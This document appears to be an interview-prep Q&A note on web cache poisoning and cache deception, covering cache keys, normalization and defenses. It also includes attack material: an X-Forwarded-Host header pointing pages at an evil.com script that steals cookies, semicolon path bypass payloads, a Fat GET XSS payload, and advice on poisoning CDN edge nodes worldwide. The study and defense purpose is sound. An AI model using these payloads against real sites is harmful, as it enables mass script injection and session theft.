---
tags: [interview, web-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Web Security"
topic: "QnA - Web Module 20"
---

# Web QnA - Module 20 - Web Cache Deception and Poisoning

## Architectural Overview: The Cache Poisoning Lifecycle

```text
    [ Attacker ]                           [ Web Cache / CDN ]                       [ Backend Web Server ]
         |                                         |                                         |
         | 1. Malicious Request                    |                                         |
         | GET /page HTTP/1.1                      |                                         |
         | Host: target.com                        |                                         |
         | X-Forwarded-Host: evil.com    --------->| (Cache miss. forwards request) -------->|
         |                                         |                                         |
         |                                         |                                         | 2. Server uses X-Forwarded-Host
         |                                         |                                         |    to generate DOM URLs
         |                                         |<----------------------------------------|
         |                                         | 3. Response:                            |
         |                                         | <script src="//evil.com/app.js">        |
         | 4. Attacker receives poisoned payload <-| Cache stores response against the     |
         |                                         | Cache Key: [GET + Host: target.com]     |
         |                                         |                                         |
    [ Victim ]                                     |                                         |
         |                                         |                                         |
         | 5. Normal Request                       |                                         |
         | GET /page HTTP/1.1                      |                                         |
         | Host: target.com              --------->| 6. Cache HIT! (Keys match)              |
         |<----------------------------------------|    Returns cached malicious payload     |
         | Victim browser loads evil.com script    |                                         |
```

## Formal Technical Questions

**Q1: Explain the fundamental difference between Web Cache Poisoning and Web Cache Deception. Who is the target in each scenario?**
**A1:** 
**Web Cache Poisoning** targets the cache server itself. The attacker sends a crafted request containing unkeyed malicious inputs (like an `X-Forwarded-Host` header). The backend application reflects this payload in the response (e.g., injecting an XSS payload). The cache stores this malicious response against a legitimate, generic Cache Key. When *any subsequent victim* requests that legitimate page, the cache serves the attacker's poisoned payload. The impact is usually mass XSS or denial of service.
**Web Cache Deception** targets a specific victim's sensitive data. The attacker tricks an authenticated victim into visiting a crafted URL (e.g., `https://target.com/profile/account.css`). The backend application ignores the `.css` extension, processes the `/profile` path, and returns the victim's sensitive profile data. However, the Cache server sees the `.css` extension, assumes it is a static asset, and caches the response. The attacker then requests that same `.css` URL and reads the victim's cached profile data.

**Q2: What is a "Cache Key", and why are "Unkeyed Inputs" the primary vector for Web Cache Poisoning?**
**A2:** 
A Cache Key is the unique identifier the caching server uses to store and retrieve a response. Typically, the key is constructed from the HTTP Method, the Host header, and the Request Path/Query (`GET + target.com + /index.html`). 
"Unkeyed Inputs" are components of the HTTP request (usually custom headers like `X-Forwarded-For`, `User-Agent`, or unknown query parameters) that the backend application processes, but the cache server *ignores* when creating the Cache Key.
If an attacker injects a payload into an unkeyed input, and the backend reflects it into the response, the cache will save that malicious response. Because the input was unkeyed, a victim making a normal request (without the malicious headers) will match the same Cache Key and receive the poisoned payload.

**Q3: Describe how Cache Key Normalization discrepancies can lead to cache-based vulnerabilities.**
**A3:** 
Normalization involves how the cache and the backend server decode and interpret URLs (e.g., URL encoding, path traversal sequences `../`, case sensitivity).
If the cache normalizes differently than the backend, vulnerabilities arise. For example, a cache might view `/profile%2f..%2fadmin` as a request for the `/profile` directory (and cache it based on public caching rules for that directory), while the backend application decodes it and routes the request to the sensitive `/admin` endpoint. The cache inadvertently stores an administrative response against a publicly accessible cache key, exposing sensitive data to anyone who requests that key.

## Scenario-Based Questions

**Q4: You are targeting a web application sitting behind Cloudflare. You find an endpoint `GET /dashboard` that reflects the `X-Original-URL` header into a `<link>` tag. You confirm it is unkeyed. However, when you poison it, the cache only stores the response for your specific geographical region. How do you escalate this to affect global users?**
**A4:** 
CDNs like Cloudflare utilize geographically distributed edge nodes. When I poison the cache from my location, only my local edge node caches the response. 
To achieve global poisoning, I must systematically route my poisoned requests through proxies or VPNs located in the various geographical regions where the target's primary user base resides. By running a distributed script (using services like AWS Lambda across multiple regions or a proxy network), I can rapidly send the poisoning payload to every major CDN edge node simultaneously, ensuring a global cache hit for all victims.

**Q5: During an assessment, you notice the application uses Web Cache Deception defenses: it strictly validates file extensions and refuses to route `/profile/x.css`. However, the application uses a RESTful routing framework. How might you bypass the extension restriction using path delimiters?**
**A5:** 
RESTful frameworks often parse paths dynamically and might treat certain characters as delimiters, ignoring everything that follows. I will fuzz the path using characters like `;`, `%3b`, `?`, `#`, or `%00`.
For example, I would test:
- `GET /profile;x.css`
- `GET /profile%3bx.css`
- `GET /profile/..;/profile/x.css`
If the backend framework (e.g., Spring Boot, which notoriously ignored path parameters after semicolons) processes `/profile` but the Cache (like Akamai or Varnish) sees the URL ending in `.css` and caches it, I have successfully bypassed the defense and achieved Web Cache Deception.

**Q6: You find a target where all headers are strictly keyed, preventing traditional Cache Poisoning. However, you notice the application reflects standard query parameters into the page (e.g., `?search=term`). The cache keys the `search` parameter. How can you perform a "Fat GET" attack to poison the cache?**
**A6:** 
A "Fat GET" attack exploits discrepancies in how caches and backends handle HTTP bodies in GET requests. Standard GET requests shouldn't have a body, but some backends accept them.
1. I send a GET request where the cache key parameter is benign: `GET /search?query=apple`.
2. I add a body to this GET request containing the malicious parameter: `query="><script>alert(1)</script>`.
If the Cache ignores the body in a GET request (keying only the URL), but the backend framework (like Ruby on Rails or certain Node.js configurations) merges URL parameters and body parameters, the backend might process the malicious body parameter instead of the URL parameter. 
The Cache stores the XSS-laden response against the benign URL `?query=apple`. When a victim visits the benign URL (without the body), they get hit with the cached XSS.

## Deep-Dive Defensive Questions

**Q7: Explain the purpose of the `Vary` header. How does properly configuring it prevent Web Cache Poisoning via Unkeyed Headers?**
**A7:** 
The `Vary` HTTP response header tells the cache server which request headers were used by the backend to dynamically generate the response. 
If an application alters its response based on the `User-Agent` or `X-Forwarded-Host` header, the backend MUST include `Vary: User-Agent` or `Vary: X-Forwarded-Host` in the response.
When the Cache sees the `Vary` header, it incorporates those specified headers into the Cache Key. Therefore, if an attacker sends a malicious `X-Forwarded-Host`, the cache creates a *new, unique* Cache Key specifically for that malicious header. When a legitimate user requests the page without the malicious header, they will not match the attacker's cache key, completely nullifying the poisoning attack.

**Q8: To prevent Web Cache Deception, what architectural rule should be enforced at the CDN/Cache layer regarding caching static extensions vs. caching behavior?**
**A8:** 
Caching should **never** be based purely on the file extension present in the URL (e.g., `if url ends with .css -> cache`). This is the root cause of Web Cache Deception.
Instead, caching must be based on the `Content-Type` header returned by the backend, or rely entirely on standard HTTP caching directives (`Cache-Control: public, max-age=...`). 
Architecturally, the CDN should only cache a response if the backend explicitly instructs it to do so via `Cache-Control` headers. If the backend is returning sensitive JSON data, it will return `Cache-Control: private, no-cache`. The CDN must respect this directive, regardless of whether the URL ends in `.jpg` or `.css`.

## Real-World Attack Scenario

**The Stored DOM XSS via Unkeyed Host Header**
An e-commerce platform utilized Varnish Cache. The development team included a script dynamically loading analytics based on the `X-Forwarded-Host` header to track multi-tenant storefronts. 

1. **Reconnaissance:** The attacker used Param Miner (a Burp extension) and discovered the `X-Forwarded-Host` header was unkeyed by Varnish but reflected in the backend response inside a `<script src="//[HEADER_VALUE]/analytics.js">` tag.
2. **Exploitation:** The attacker hosted a malicious JavaScript file at `evil.com/analytics.js` containing a payload to steal session cookies.
3. **Execution:** The attacker sent a request to the main homepage (`GET / HTTP/1.1`) with the header `X-Forwarded-Host: evil.com`. 
4. **Poisoning:** The backend returned the page with `<script src="//evil.com/analytics.js">`. Varnish saw the `Cache-Control: public` header and cached the response against the generic key `GET /`.
5. **Impact:** For the next hour (the cache TTL), every single legitimate customer who visited the homepage received the poisoned cached response. Their browsers executed the attacker's JavaScript, resulting in the mass theft of thousands of authentication cookies.

## Chaining Opportunities

- **Cache Poisoning -> Open Redirect:** Poisoning an unkeyed header that constructs a 302 Redirect, forcing all subsequent visitors to the endpoint to be silently redirected to a phishing page.
- **Cache Deception -> Account Takeover:** Tricking an admin into visiting `/settings/api-keys;.png`, causing their API keys to be cached on the public CDN, which the attacker then retrieves.
- **Cache Poisoning -> RCE:** In older infrastructure, poisoning the cache of an internal software update endpoint. When internal servers ping the endpoint for updates, they receive and execute a poisoned payload.

## Related Notes
- [[21 - Advanced Cross-Site Scripting (XSS)]]
- [[02 - Web Application Firewalls (WAF) Bypass]]
- [[22 - Open Redirect Vulnerabilities]]
- [[10 - HTTP Request Smuggling]]
